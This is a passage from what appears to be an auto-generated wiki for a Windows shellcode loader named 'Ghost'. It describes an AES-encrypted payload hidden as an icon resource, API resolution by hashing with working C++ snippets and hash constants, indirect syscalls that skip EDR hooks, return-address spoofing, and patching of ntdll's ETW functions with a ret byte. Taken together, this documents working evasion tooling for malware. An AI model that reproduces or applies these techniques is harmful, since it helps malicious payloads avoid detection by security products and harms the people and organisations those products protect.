+<li><strong><code>InitializeRC4EncryptionDecryptionData</code> / <code>InitializeRC4EncryptionDecryptionKey</code></strong> — two macros that zero and populate a <code>USTRING</code> (<code>Buffer</code>, <code>Length</code>, <code>MaximumLength</code>) from buffer+length, intended to initialize RC4 data/key string structures.</li>
+<li><strong><code>_DEBUG_PRINT</code></strong> — a compile-time toggle: it is <code>#define</code>d by default, and comments instruct that undefining it removes diagnostic <code>std::cout</code> print statements at compilation. The <code>#ifdef _DEBUG_PRINT</code> guards in <code>unhook.h</code>, <code>etw.h</code>, <code>Ghost.cpp</code>, <code>allocator.h</code>, and <code>rsrc.h</code> all turn their <code>[DEBUG] ...</code> chatter on and off through this single switch.</li>
+</ul>
+<h2>The RCDATA1 resource identifier (Resource.rc / resource1.h)</h2>
+<p><code>resource1.h</code> is the Visual C++ generated header behind <code>Resource.rc</code>. It defines:</p>
+<ul>
+<li><strong><code>IDR_RCDATA1 (101)</code></strong> — the identifier used to embed the AES-encrypted shellcode.</li>
+</ul>
+<p><code>Resource.rc</code> contains a single line, <code>IDR_RCDATA1 RCDATA &quot;icon.ico&quot;</code>, which binds <code>IDR_RCDATA1</code> to a custom <code>RCDATA</code> resource whose bytes are read from the file <code>icon.ico</code>. At runtime <code>rsrc.h</code>&#39;s <code>GetFromRc()</code> retrieves that payload by calling <code>FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA)</code> → <code>LoadResource</code> → <code>LockResource</code> → <code>SizeofResource</code>, then hands the bytes to <code>AESDecrypt</code> in <code>main()</code> for decryption before staging. Together this lets the loader carry its encrypted shellcode as a data resource rather than in a plain import/global — the same resource that <code>build.py</code> regenerates (along with the AES key/IV) for each build.</p>
+<p>The combined data flow that ties these shared definitions together:</p>
+<div class="mermaid pending">flowchart TD
+    A[&quot;types.h: Sys* prototypes&quot;] --&gt; B[&quot;syscalls.asm: NASM indirect syscall thunks&quot;]
+    B --&gt; C[&quot;functions.h: GetSysCallByWalking fills SSN + addr&quot;]
+    A --&gt; D[&quot;functions.h: hash-resolved function-pointer globals&quot;]
+    D --&gt; E[&quot;RetSpoofCall wrapped calls&quot;]
+    F[&quot;resource1.h: IDR_RCDATA1 = 101&quot;] --&gt; G[&quot;Resource.rc: RCDATA from icon.ico&quot;]
+    G --&gt; H[&quot;rsrc.h: GetFromRc() loads resource&quot;]
+    I[&quot;structs.h: PS_ATTRIBUTE_LIST / PS_CREATE_INFO / RTL_USER_PROCESS_PARAMETERS&quot;] --&gt; J[&quot;ntprocessapi.h: NtCreateUserSuspendedProcess&quot;]
+    J --&gt; B
+    H --&gt; K[&quot;etw.h / unhook.h / allocator.h / hook.h use SELF_HANDLE + NTAPI_VALIDATE_RETURN* from defs.h&quot;]
+</div>
+<p><em>How the shared types drive module behavior: typedefs become resolved globals, the <code>Sys*</code> prototypes bind to assembly syscall thunks, the resource identifier feeds the loader&#39;s payload, and defs.h macros standardize handle and error handling everywhere.</em></p>
+<h2>Invariants and failure semantics</h2>
+<ul>
+<li><strong>Error handling is consistent by return convention.</strong> Every NT call that matters funnels through either the explicit <code>NTAPI_VALIDATE_RETURN*</code> macros (which abort the enclosing function with <code>-1</code>/<code>void</code>/<code>NULL</code> on non-zero status) or an explicit <code>status != ERROR_SUCCESS</code> comparison that prints a hex status and returns early (as in <code>unhook.h</code>, <code>ntprocessapi.h</code>).</li>
+<li><strong>Only the <code>Sys*</code> indirect syscalls are <code>extern &quot;C&quot;</code>.</strong> Direct-called APIs are resolved as typed globals in <code>functions.h</code>; only the four assembly-backed syscalls need C linkage so <code>syscalls.asm</code> can reference their symbols directly.</li>
+<li><strong>The resource and the crypto key/IV are per-build artifacts.</strong> <code>IDR_RCDATA1</code> always names the payload resource, but its bytes (<code>icon.ico</code>) and the AES key/IV used to decrypt it are regenerated per build by <code>build.py</code>, so the shared types stay stable while the secrets change.</li>
+<li><strong>These headers are contract-only; they hold no global state.</strong> <code>structs.h</code>/<code>types.h</code>/<code>defs.h</code> declare types and macros, and the actual initialized globals (<code>functions.h</code>&#39;s pointers, the <code>dwNt*</code>/<code>sysCallNt*</code> SSN pairs, <code>Gdgt</code>, <code>rc4key</code>, etc.) live in implementation modules. Any module that wants to call into this machinery includes <code>functions.h</code> rather than the type headers alone.</li>
+</ul>
+</article><article class="wiki-page" id="page-4"><div class="page-label">PAGE 4 · concepts/api-resolution-and-hashing.md</div><hr>
+<p>type: concept
+title: API Resolution &amp; Custom Hashing (resolvers.h, hash.h, functions.h)
+description: How Ghost resolves Windows API functions without importing them at link time, using PEB loader walking, PE export-table parsing, and a custom WEIRDHASHA hash function, plus SSN and decoy-address resolution for indirect syscalls.
+tags: [api-resolution, api-hashing, peb-walking, export-directory, indirect-syscalls, weirhasha, ssn]
+verified:</p>
+<ul>
+<li>by: openwiki/0.5.0
+at: 2026-09-03T03:10:44.817Z
+sources:</li>
+<li>id: openwiki-source-dcba33204cd15ff156692bf1
+resource: repo://functions.h</li>
+<li>id: openwiki-source-96fc8fb8f4406029a00adfc5
+resource: repo://hash.h</li>
+<li>id: openwiki-source-8194cb6085876618fe7c465b
+resource: repo://resolvers.h</li>
+<li>id: openwiki-source-dc732a9699d4eb3a37e389fd
+resource: repo://structs.h</li>
+<li>id: openwiki-source-28a2ba913c2f3cb2e3abbe21
+resource: repo://syscalls.asm</li>
+<li>id: openwiki-source-16495399652492148bfde7f3
+resource: repo://unhook.h
+generated: { by: &quot;openwiki/0.5.0&quot;, at: &quot;2026-09-03T03:10:44.817Z&quot; }</li>
+</ul>
+<hr>
+<h1>API Resolution &amp; Custom Hashing (resolvers.h, hash.h, functions.h)</h1>
+<p>Ghost avoids static linking and import-table references almost entirely. Instead of letting the loader build an import address table that security tooling can scan, it resolves every module base and every function address at runtime by <strong>hashing a string and matching it against values computed from in-memory metadata</strong>. This page documents the custom hash function, the PEB-based module lookup, the PE export-directory function lookup, and the SSN/decoy resolution that feeds the indirect syscall layer.</p>
+<p>Three headers cooperate to make this work:</p>
+<ul>
+<li><strong><code>hash.h</code></strong> — <code>WEIRDHASHA</code> and its helper <code>getStringAsDWORD</code>, the string-hashing primitive every resolver depends on.</li>
+<li><strong><code>resolvers.h</code></strong> — <code>GetLoadedDllHandleH</code> (module lookup by walking the PEB loader lists), <code>GetFunctionAddressH</code> (function lookup by parsing a module&#39;s <code>IMAGE_EXPORT_DIRECTORY</code>), <code>GetSysCallByWalking</code> (SSN + decoy syscall resolution), and <code>IsHooked</code> (syscall-prologue hook detection). It also carries name-based variants (<code>GetLoadedDllHandleByName</code>, <code>GetFunctionAddressByName</code>) used by the unhooking logic.</li>
+<li><strong><code>functions.h</code></strong> — the central registry: it instantiates every resolved <code>HMODULE</code> and function-pointer global by evaluating the resolver functions at load, and it declares the SSN and decoy-address variables that <code>syscalls.asm</code> consumes.</li>
+</ul>
+<p><code>structs.h</code> supplies the PEB / <code>PEB_LDR_DATA</code> / <code>LDR_DATA_TABLE_ENTRY</code> layouts that <code>resolvers.h</code> walks (see <a href="#page-3">shared-types-and-constants</a>).</p>
+<h2>The WEIRDHASHA hash primitive (hash.h)</h2>
+<p><code>WEIRDHASHA</code> is the single string-hash used for both module and function lookup. Its signature is <code>DWORD WEIRDHASHA(const char* String, SIZE_T Iterations)</code>, where <code>Iterations</code> controls how many times the base hash is folded.</p>
+<pre><code class="language-cpp">DWORD WEIRDHASHA(_In_ const char* String, SIZE_T Iterations) {
+    SIZE_T Index = 0;
+    DWORD Hash = 5381;           // starting seed
+    SIZE_T Length = Iterations;
+
+    while (Index != Length) {    // fold multiply exactly Iterations times
+        Hash = (Hash &lt;&lt; 5) + Hash;   // Hash * 33
+        Index++;
+    }
+
+    DWORD dwString = getStringAsDWORD(String);   // hash of the string characters
+    return Hash * dwString + lstrlenA(String);   // multiply by string-DWORD, add length
+}
+</code></pre>
+<p>The algorithm:</p>
+<ol>
+<li><strong>Seed</strong> the accumulator at <code>5381</code>.</li>
+<li><strong>Fold <code>Hash * 33</code></strong> (<code>(Hash &lt;&lt; 5) + Hash</code>) exactly <code>Iterations</code> times. The caller chooses this count, so the same string hashes differently depending on context — <code>GetLoadedDllHandleH</code> uses <strong>28</strong> iterations for module names and <code>GetFunctionAddressH</code> uses <strong>27</strong> for function names.</li>
+<li>Compute <code>getStringAsDWORD(String)</code>, which walks the whole string accumulating <code>value = (value &lt;&lt; 5) + value + str[i]</code> (i.e. <code>value * 33 + char</code>), starting from 0.</li>
+<li>Return <code>Hash * dwString + lstrlenA(String)</code>.</li>
+</ol>
+<p>The multiply-by-<code>dwString</code> plus the string length makes the hash highly specific to both content and length, so a hardcoded numeric constant in the source unambiguously identifies one export or module. Because these constants are baked into <code>functions.h</code>, they are only valid as long as the running Windows build&#39;s export names and module full-names hash to the same values — a point the loader already accepts since it targets the standard ntdll/kernelbase exports.</p>
+<h2>Resolving a module base: GetLoadedDllHandleH (PEB walking)</h2>
+<p><code>GetLoadedDllHandleH(DWORD dwHash)</code> returns an <code>HMODULE</code> by walking the <strong><code>InLoadOrderModuleList</code></strong> of the process loader data, instead of calling <code>GetModuleHandle</code>/<code>LoadLibrary</code>. It works because every loaded module already has a <code>LDR_DATA_TABLE_ENTRY</code> whose <code>FullDllName.Buffer</code> is a wide path string.</p>
+<pre><code class="language-cpp">PPEB peb = reinterpret_cast&lt;PPEB&gt;(__readgsqword(96));          // TEB-&gt;ProcessEnvironmentBlock
+PPEB_LDR_DATA ldr = reinterpret_cast&lt;PPEB_LDR_DATA&gt;(peb-&gt;Ldr);
+PLDR_DATA_TABLE_ENTRY ldte = ... ldr-&gt;InLoadOrderModuleList.Flink;
+
+while (true) {
+    // copy FullDllName.Buffer into a CHAR ANSI[] buffer
+    DWORD Hash = WEIRDHASHA(ANSI, 28);
+    if (dwHash == Hash) return reinterpret_cast&lt;HMODULE&gt;(ldte-&gt;DllBase);
+    ldte = ... ldte-&gt;InLoadOrderLinks.Flink;   // next module in load order
+}
+</code></pre>
+<p>Mechanics worth noting:</p>
+<ul>
+<li><code>__readgsqword(96)</code> reads the x64 <code>ProcessEnvironmentBlock</code> pointer from the TEB (GS segment offset 0x60). <code>peb-&gt;Ldr</code> reaches <code>PEB_LDR_DATA</code>, and <code>ldr-&gt;InLoadOrderModuleList.Flink</code> is the first loaded module.</li>
+<li>Each <code>FullDllName.Buffer</code> is converted character-by-character from wide to a local <code>CHAR ANSI[]</code> array before hashing, so the resolver never needs <code>WideCharToMultiByte</code>.</li>
+<li>The returned <code>DllBase</code> is cast to <code>HMODULE</code>. Lookups use the <strong>full DLL path string</strong> (e.g. <code>C:\Windows\System32\ntdll.dll</code>), which is why the module hash constants (ntdll = <code>776560387</code>, kernelbase = <code>3314415166</code>) reflect those full paths.</li>
+<li>There is no bound on the walk; it iterates the load-order list until a hash match or the list cycles.</li>
+</ul>
+<p><code>functions.h</code> uses this at load time to grab <code>hNT</code> and <code>hkb</code>:</p>
+<pre><code class="language-cpp">HMODULE hNT  = GetLoadedDllHandleH(776560387);   // ntdll
+HMODULE hkb  = GetLoadedDllHandleH(3314415166);  // kernelbase
+</code></pre>
+<p><code>Bcrypt</code>, by contrast, is loaded directly with <code>LoadLibraryW(L&quot;Bcrypt.dll&quot;)</code> because that module is not guaranteed to be present in the load-order list yet.</p>
+<h2>Resolving a function address: GetFunctionAddressH (export-directory parsing)</h2>
+<p><code>GetFunctionAddressH(HMODULE DllHandle, DWORD dwHash)</code> is the project&#39;s <code>GetProcAddress</code> replacement. It parses the module&#39;s PE headers and <code>IMAGE_EXPORT_DIRECTORY</code>, matching each export name against <code>WEIRDHASHA(Name, 27)</code>.</p>
+<pre><code class="language-cpp">uintptr_t DllBase = (uintptr_t)DllHandle;
+PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)DllBase;      // check e_magic == IMAGE_DOS_SIGNATURE
+PIMAGE_NT_HEADERS nt  = DllBase + dos-&gt;e_lfanew;         // check Signature == IMAGE_NT_SIGNATURE
+PIMAGE_EXPORT_DIRECTORY pExport = DllBase + nt-&gt;OptionalHeader
+                                        .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+
+PDWORD AddressOfNames      = DllBase + pExport-&gt;AddressOfNames;      // RVA list of name strings
+PDWORD AddressOfFunctions  = DllBase + pExport-&gt;AddressOfFunctions;  // RVA list of entry points
+PWORD  AddressOfOrdinals   = DllBase + pExport-&gt;AddressOfNameOrdinals;
+
+for (int i = 0; i &lt; pExport-&gt;NumberOfNames; i++) {
+    char* Name = (char*)(DllBase + AddressOfNames[i]);
+    if (dwHash == WEIRDHASHA(Name, 27))
+        return (FARPROC)(DllBase + AddressOfFunctions[AddressOfOrdinals[i]]);
+}
+return NULL;
+</code></pre>
+<p>Steps:</p>
+<ol>
+<li>Validate the DOS and NT signatures; on mismatch it prints a diagnostic but continues.</li>
+<li>Compute the export directory RVA from the <code>IMAGE_DIRECTORY_ENTRY_EXPORT</code> data-directory entry and add the base to reach <code>pExportDirectory</code>.</li>
+<li>Resolve the three RVA tables (names, functions, name-ordinals) by adding <code>DllBase</code> to each stored RVA.</li>
+<li>Linear-scan <code>AddressOfNames</code>, hashing each ASCII export name with 27 iterations, and return the matching entry point resolved through the ordinal array.</li>
+</ol>
+<p>Because the function name is what is hashed, the constants in <code>functions.h</code> such as <code>GetFunctionAddressH(hNT, 3966201525)</code> for <code>NtWriteVirtualMemory</code> are computed over the plain export name string (<code>&quot;NtWriteVirtualMemory&quot;</code>), not a decorated/import name. The <code>e_</code>-prefixed kernelbase/Bcrypt globals (<code>e_ConvertThreadToFiber</code>, <code>e_BCryptDecrypt</code>, ...) are resolved the same way, just on their respective module handles.</p>
+<h2>functions.h: the central registry</h2>
+<p><code>functions.h</code> is where all resolved globals are materialized. Each line evaluates the resolver chains described above at static initialization and binds a typed pointer to <code>GetFunctionAddressH</code> (or <code>GetSysCallByWalking</code>):</p>
+<ul>
+<li><strong>Module handles</strong> — <code>hNT</code>, <code>hkb</code> via <code>GetLoadedDllHandleH</code>, <code>hBcrypt</code> via <code>LoadLibraryW</code>.</li>
+<li><strong>ntdll function pointers</strong> — <code>NtWriteVirtualMemory</code>, <code>NtAllocateVirtualMemory</code>, <code>NtProtectVirtualMemory</code>, <code>NtReadVirtualMemory</code>, <code>RtlInitUnicodeString</code>, <code>RtlCreateProcessParametersEx</code>, <code>NtWaitForSingleObject</code>, <code>NtCreateEvent</code>, each <code>reinterpret_cast</code> to the typedef declared in <code>types.h</code>.</li>
+<li><strong>kernelbase function pointers</strong> — the fiber APIs (<code>e_ConvertThreadToFiber</code>, <code>e_CreateFiber</code>, <code>e_SwitchToFiber</code>) and resource APIs (<code>e_FindResourceW</code>, <code>e_LoadResource</code>, <code>e_LockResource</code>, <code>e_SizeofResource</code>).</li>
+<li><strong>Bcrypt function pointers</strong> — the <code>e_BCrypt*</code> AES chain used by <code>AES.h</code>.</li>
+<li><strong>SSN / syscall variables</strong> — <code>DWORD dwNt*</code> (SSN values) and <code>UINT_PTR sysCallNt*</code> (decoy syscall addresses), populated by <code>GetSysCallByWalking</code>, which are <code>extern &quot;C&quot;</code> so <code>syscalls.asm</code> can reference them by plain symbol name.</li>
+</ul>
+<p>The entire page&#39;s hashed address resolution is captured in the relationship below.</p>
+<div class="mermaid pending">flowchart TD
+    A[&quot;WEIRDHASHA (hash.h)&quot;] --&gt; B[&quot;GetLoadedDllHandleH (resolvers.h)&quot;]
+    A --&gt; C[&quot;GetFunctionAddressH (resolvers.h)&quot;]
+    B --&gt; D[&quot;hNT / hkb handles&quot;]
+    B --&gt; E[&quot;GetSysCallByWalking ntdll base&quot;]
+    C --&gt; F[&quot;ntdll / kernelbase / BCrypt fn pointers&quot;]
+    E --&gt; G[&quot;dwNt* SSN + sysCallNt* decoy addr&quot;]
+    D --&gt; C
+    D --&gt; F
+    F --&gt; H[&quot;Every RetSpoofCall&#39;d API call&quot;]
+    G --&gt; I[&quot;syscalls.asm indirect syscall thunks&quot;]
+</div>
+<p><em>How hash.h feeds the resolvers, which in turn populate the functions.h globals that the rest of the loader and the assembly syscall layer consume.</em></p>
+<h2>SSN resolution &amp; decoy syscall addresses: GetSysCallByWalking</h2>
+<p>For indirect syscalls, Ghost cannot just resolve a function pointer — it needs the <strong>service syscall number (SSN)</strong> that the <code>syscall</code> instruction reads from <code>eax</code>, plus the address of an <strong>unhooked <code>syscall</code> stub</strong> in ntdll to jump into. <code>GetSysCallByWalking(dwFunctionHash, OUT PDWORD SSN, OUT UINT_PTR* SysCallAddr)</code> computes both from the resolved function&#39;s surrounding ntdll code.</p>
+<pre><code class="language-cpp">FARPROC pfunc = GetFunctionAddressH(GetLoadedDllHandleH(776560387), dwFunctionHash);
+fAddress = (uintptr_t)pfunc;
+int track = 1, offset = 0x20;
+while (true) {
+    PBYTE neighbor = (PBYTE)(fAddress + offset);
+    if (!IsHooked(neighbor)) {                       // clean syscall stub found
+        if (neighbor[5] != 0x00)                     // SSN is 3 bytes wide here
+            *SSN = ((neighbor[5] &lt;&lt; 8) | neighbor[4]) - track;
+        else
+            *SSN = (DWORD)neighbor[4] - track;
+        *SysCallAddr = (uintptr_t)neighbor + 0x12;   // address of the syscall instruction
+        return NULL;
+    }
+    track++; offset += 0x20;                         // hooked stub, move to next
+}
+</code></pre>
+<p>The logic:</p>
+<ol>
+<li>Resolve the real ntdll function address by hash (<code>GetFunctionAddressH</code> on the hash-resolved ntdll base), as above.</li>
+<li>Scan <strong>forward</strong> through adjacent 0x20 (32-byte) function stubs. ntdll&#39;s exported syscall stubs are laid out contiguously at 0x20 stride, one per syscall, in SSN order.</li>
+<li><code>IsHooked(neighbor)</code> checks the standard syscall prologue bytes <code>4C 8B D1 B8</code> (<code>mov r10, rcx</code> / <code>mov eax, imm</code>); if the prologue has been overwritten (a userland hook), it skips to the next stub and bumps <code>track</code>.</li>
+<li>From the first unhooked neighbor, the SSN is read out of the <code>mov eax, &lt;imm&gt;</code> immop (<code>neighbor[4]</code>, or a 16-bit value at <code>[4..5]</code> when it is 3 bytes) and corrected by <code>- track</code> to account for the skipped hooked stubs.</li>
+<li>The decoy <code>syscall</code> address is set to <code>neighbor + 0x12</code>, the offset of the <code>syscall</code> instruction inside the clean stub.</li>
+</ol>
+<p><code>functions.h</code> invokes it for the four syscalls the assembly layer needs:</p>
+<pre><code class="language-cpp">PVOID s = GetSysCallByWalking(2050401239, &amp;dwNtCreateUserProccess, &amp;sysCallNtCreateProcess); // NtCreateUserProcess
+PVOID h = GetSysCallByWalking(809892425,  &amp;dwNtReadVirtualMemory,  &amp;sysCallNtRead);          // NtReadVirtualMemory
+PVOID i = GetSysCallByWalking(3375077829, &amp;dwNtProtectVirtualMemory,&amp;sysCallNtProtect);       // NtProtectVirtualMemory
+PVOID t = GetSysCallByWalking(2224556388, &amp;dwNtTerminateProcess,   &amp;sysCallNtTerminate);     // NtTerminateProcess
+</code></pre>
+<p><code>syscalls.asm</code> then builds each <code>Sys*</code> thunk that loads the stored SSN into <code>eax</code> and <code>jmp</code>s to the stored decoy address:</p>
+<pre><code class="language-nasm">SysNtReadVirtualMemory:
+    mov eax, dword [dwNtReadVirtualMemory]
+    jmp qword [sysCallNtRead]
+    ret
+</code></pre>
+<p>This keeps the <code>syscall</code> instruction executing from within ntdll (not from the caller&#39;s module that EDR scans), while the SSN value is supplied by the loader&#39;s own data. The full mechanism is covered on the <a href="#page-8">indirect-syscalls</a> page.</p>
+<h2>IsHooked: detecting a patched syscall prologue</h2>
+<p><code>IsHooked(PBYTE functionbytes)</code> is the hook check <code>GetSysCallByWalking</code> relies on. It verifies the four bytes that begin a clean ntdll syscall stub match the standard epilog/prologue, and reports hooked if any byte differs:</p>
+<pre><code class="language-cpp">BOOL IsHooked(PBYTE functionbytes) {
+    if (functionbytes[0] != 0x4C &amp;&amp; functionbytes[1] != 0x8b
+        &amp;&amp; functionbytes[2] != 0xd1 &amp;&amp; functionbytes[3] != 0xb8)
+        return TRUE; // hooked
+    return FALSE;
+}
+</code></pre>
+<p>The expected bytes <code>4C 8B D1 B8</code> are <code>mov r10, rcx ; mov eax, &lt;imm32&gt;</code>, the canonical opening of an ntdll syscall wrapper. A <code>jmp</code> hook or a software breakpoint transplanted into the prologue breaks this pattern, so the walker can skip tampered stubs and still land on a clean one. Because this only inspects the first four bytes, it is a heuristic — a sufficiently sophisticated hook that preserves the prologue would evade it — but it is sufficient for EDR trampoline hooks that overwrite the leading instructions.</p>
+<h2>Name-based variants used by unhooking</h2>
+<p><code>resolvers.h</code> also carries two non-hashed variants for clarity in the unhooking path:</p>
+<ul>
+<li><strong><code>GetLoadedDllHandleByName(const wchar_t* DllName)</code></strong> — walks the same <code>InLoadOrderModuleList</code>, but matches <code>BaseDllName</code> with <code>wcscmp</code>. Passing <code>NULL</code> returns <code>peb-&gt;ImageBaseAddress</code> (the running EXE&#39;s base).</li>
+<li><strong><code>GetFunctionAddressByName(HMODULE, const char*)</code></strong> — the export-directory scan identical to <code>GetFunctionAddressH</code>, but matching export names with <code>strcmp</code> instead of <code>WEIRDHASHA</code>.</li>
+</ul>
+<p>These are used where the code already knows the literal name (notably <code>unhook.h</code>), while the hashed variants hide string constants from the static import/string scan elsewhere.</p>
+<h2>Integration, invariants, and failure semantics</h2>
+<ul>
+<li><strong>Everything resolves during static initialization.</strong> <code>functions.h</code>&#39;s globals are <code>GetFunctionAddressH</code>/<code>GetSysCallByWalking</code> calls evaluated before <code>main()</code>, so any module that includes <code>functions.h</code> can call the resolved pointers directly. There is no lazy/on-demand resolution.</li>
+<li><strong>Hash constants are coupled to the hash function and the build.</strong> A hardcoded <code>DWORD</code> is meaningless without <code>WEIRDHASHA</code>&#39;s exact seed, iteration counts (28 for modules, 27 for functions), and the <code>* dwString + length</code> folding. Changing the hash function invalidates every constant in <code>functions.h</code>. The page instruction on <code>hash.h</code> stresses this coupling deliberately.</li>
+<li><strong>The same module handle flows through both hash and name paths.</strong> <code>GetImageSizeFromBase</code>/<code>ReadBufferFromProcess</code> in <code>unhook.h</code> obtain ntdll via <code>GetLoadedDllHandleH(776560387)</code> and then use the name-based resolvers to read a clean copy, tying the hashed module base and the SSN machinery together.</li>
+<li><strong>Failure modes are non-fatal by design.</strong> <code>GetFunctionAddressH</code> returns <code>NULL</code> (no match found), <code>GetLoadedDllHandleH</code> loops indefinitely if the hash never matches (no explicit termination), and the signature/NT-mismatch checks print a diagnostic but continue. <code>GetSysCallByWalking</code> never explicitly returns the found syscall — its results are delivered through the out-parameters <code>SSN</code> and <code>SysCallAddr</code>.</li>
+<li><strong>SSN offset math depends on contiguous 0x20 stubs.</strong> The <code>- track</code> correction assumes hooked stubs are skipped in lockstep with the track counter, so the derived SSN always lands on the true service number even when leading stubs are patched.</li>
+<li><strong>Decoy address is always <code>+0x12</code> inside the stub.</strong> The <code>syscall</code> instruction sits at that fixed offset within a 0x20 ntdll stub, so once an unhooked stub is identified both its SSN and its <code>syscall</code> address are known.</li>
+</ul>
+</article><article class="wiki-page" id="page-5"><div class="page-label">PAGE 5 · concepts/etw-patching.md</div><hr>
+<p>type: concept
+title: ETW Patching (etw.h)
+description: How Ghost disables Event Tracing for Windows by patching NtTraceEvent and NtTraceControl in ntdll with an early ret (0xC3) at offset +3, using API hashing, ret-spoofed NtProtectVirtualMemory/memcpy/memcmp calls, and the NTAPI_VALIDATE_RETURN2VOID error macro.
+tags: [etw, event-tracing, nt-trace, ntdll-patching, ret-spoofing, api-hashing, evasion]
+verified:</p>
+<ul>
+<li>by: openwiki/0.5.0
+at: 2026-09-03T03:10:44.817Z
+sources:</li>
+<li>id: openwiki-source-7b1ab98e51a2bbecffe695c6
+resource: repo://defs.h</li>
+<li>id: openwiki-source-6d868c08609ee9adc8759685
+resource: repo://etw.h</li>
+<li>id: openwiki-source-fa04fdb0e1e359bf40e1bf73
+resource: repo://Ghost.cpp</li>
+<li>id: openwiki-source-8194cb6085876618fe7c465b
+resource: repo://resolvers.h</li>
+<li>id: openwiki-source-554731dccd1cc779d1043b8d
+resource: repo://retaddrspoof.asm
+generated: { by: &quot;openwiki/0.5.0&quot;, at: &quot;2026-09-03T03:10:44.817Z&quot; }</li>
+</ul>
+<hr>
+<h1>ETW Patching (etw.h)</h1>
+<p>Ghost disables <strong>Event Tracing for Windows (ETW)</strong> so that security products and the OS tracing primitive cannot observe its activity. It does this by editing the in-memory <code>ntdll</code> stubs of two system calls — <code>NtTraceEvent</code> and <code>NtTraceControl</code> — replacing the first instruction that actually performs the trace with an early <code>ret</code> (<code>0xC3</code>). The implementation lives entirely in <strong><code>etw.h</code></strong>, which exposes two functions: <code>PatchETW()</code> (the entry point) and <code>ValidateMemory()</code> (a helper that confirms a patch was written correctly).</p>
+<p><code>etw.h</code> is a concentrated example of the loader&#39;s core defensive idioms, so it ties together several other concepts:</p>
+<ul>
+<li><strong>API hashing</strong> (<code>GetLoadedDllHandleH</code> / <code>GetFunctionAddressH</code> from <code>resolvers.h</code>) locates ntdll and both trace functions without importing or naming them (see <a href="#page-4">api-resolution-and-hashing</a>).</li>
+<li><strong>Return-address spoofing</strong> (<code>RetSpoofCall</code>, <code>Gdgt</code>) wraps every call the patcher makes — <code>NtProtectVirtualMemory</code>, <code>memcpy</code>, and <code>memcmp</code> — so those calls&#39; stack return addresses point at a <code>call r12</code> ROP gadget instead of back into a scanning frame.</li>
+<li><strong>Error handling</strong> uses the <code>NTAPI_VALIDATE_RETURN2VOID</code> macro from <code>defs.h</code> for each NT API status check.</li>
+</ul>
+<p>Callers invoke <code>PatchETW()</code> early in the loader&#39;s <code>main</code>, immediately after <code>FlushNTDLL()</code> and before any payload-decryption and injection work, so the tracing surface is disabled before suspicious operations begin (see <a href="#page-2">loader-pipeline</a>).</p>
+<h2>Why patch at offset +3</h2>
+<p><code>NtTraceEvent</code> and <code>NtTraceControl</code> are x64 system-call stubs emitted by ntdll. Their prologue is the conventional 64-bit syscall prologue:</p>
+<pre><code class="language-nasm">mov r10, rcx     ; 4C 8B D1  (3 bytes)
+mov eax, &lt;SSN&gt;   ; B8 ?? ?? ?? ?? 
+syscall
+</code></pre>
+<p>The first three bytes are the 3-byte <code>mov r10, rcx</code>, which Ghost must <strong>skip</strong>, because clobbering that instruction would break the stub&#39;s stack even after the <code>ret</code>. Patching the shift <code>mov rcx</code> argument would not neutralize ETW. Instead <code>PatchETW</code> writes <code>0xC3</code> (<code>ret</code>) at the <strong>byte at offset +3</strong>, i.e. immediately past <code>mov r10, rcx</code>, replacing the low byte of <code>mov eax, &lt;SSN&gt;</code>. On return to the stub the CPU now hits the inserted <code>ret</code> and bails out of the trace call before the <code>syscall</code> is issued, so no ETW notification event is emitted to the kernel.</p>
+<pre><code class="language-cpp">unsigned char* ControlProtectionOffset = pNtTraceControl + 3;
+unsigned char* EventProtectionOffset   = pNtTraceEvent + 3;
+unsigned char sourceBuffer = 0xC3;   // ret
+</code></pre>
+<p>Both offsets are the same <code>+3</code>, reflecting that both exported trace stubs share the identical prologue shape.</p>
+<h2>Resolving the targets (API hashing)</h2>
+<p>Before touching memory, <code>PatchETW</code> finds its three dependencies using the loader&#39;s hash-based resolvers rather than <code>GetModuleHandle</code>/<code>GetProcAddress</code> or a hardcoded import.</p>
+<pre><code class="language-cpp">HMODULE hNT = GetLoadedDllHandleH(776560387);                 // ntdll
+unsigned char* pNtTraceEvent   = (unsigned char*)GetFunctionAddressH(hNT, 2226474731);
+unsigned char* pNtTraceControl = (unsigned char*)GetFunctionAddressH(hNT, 2097340520);
+</code></pre>
+<ul>
+<li><code>GetLoadedDllHandleH(776560387)</code> walks the PEB load-order list and returns the base of <code>ntdll.dll</code>.</li>
+<li><code>GetFunctionAddressH(hNT, &lt;hash&gt;)</code> parses ntdll&#39;s <code>IMAGE_EXPORT_DIRECTORY</code> and returns the export whose <code>WEIRDHASHA</code> matches. The constants <code>2226474731</code> (<code>NtTraceEvent</code>) and <code>2097340520</code> (<code>NtTraceControl</code>) are the two targets Ghost patches.</li>
+</ul>
+<p>No string for either trace function ever appears in the binary; only the numeric hashes do.</p>
+<h2>Patching sequence</h2>
+<p><code>PatchETW</code> performs a classic virtual-memory write pattern: <strong>change protection → write → verify → restore protection</strong>, applied once per target. The steps:</p>
+<ol>
+<li><strong>Reserve the single-byte region</strong> <code>ntsize = 1</code> at the <code>+3</code> offset of each function.</li>
+<li><strong>Make the byte writable+executable</strong> with <code>NtProtectVirtualMemory(..., PAGE_EXECUTE_READWRITE, &amp;oldProtect)</code>, checking the result with <code>NTAPI_VALIDATE_RETURN2VOID</code>.</li>
+<li><strong>Write <code>0xC3</code></strong> via <code>memcpy</code>.</li>
+<li><strong>Verify</strong> the write with <code>ValidateMemory</code> (a <code>memcmp</code>), returning early with a <code>fprintf</code> error on mismatch.</li>
+<li><strong>Restore the original protection</strong> with a second <code>NtProtectVirtualMemory(..., oldProtect, &amp;oldProtect)</code>, again validated.</li>
+</ol>
+<pre><code class="language-cpp">NTSTATUS Controlstatus = (NTSTATUS)RetSpoofCall((void*)NtProtectVirtualMemory, 5, Gdgt,
+    SELF_HANDLE, &amp;ControlProtectionOffset, &amp;ntsize,
+    PAGE_EXECUTE_READWRITE, &amp;dwOldProtectionControl);
+NTAPI_VALIDATE_RETURN2VOID(NtProtectControl, Controlstatus);
+
+RetSpoofCall(memcpy, 3, Gdgt, ControlProtectionOffset, &amp;sourceBuffer, sizeof sourceBuffer);
+if (ValidateMemory(ControlProtectionOffset, &amp;sourceBuffer, sizeof(sourceBuffer)) != 0) {
+    fprintf(stderr, &quot;Error: failed to patch etw function NtTraceControl: Data mismatch after copy.\n&quot;);
+    return;
+}
+</code></pre>
+<p>The flow below captures the per-target pattern:</p>
+<div class="mermaid pending">flowchart TD
